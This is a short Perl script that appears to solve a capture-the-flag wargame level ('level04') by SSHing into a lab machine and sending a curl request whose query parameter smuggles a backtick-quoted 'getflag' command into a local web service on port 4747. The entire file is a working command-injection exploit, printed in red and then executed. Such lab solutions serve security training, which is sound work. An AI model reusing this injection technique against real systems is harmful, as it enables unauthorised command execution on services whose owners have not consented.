#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level04";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$inject = "curl localhost:4747/?x=\\`getflag\\`";
print $red, $inject, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$inject'");
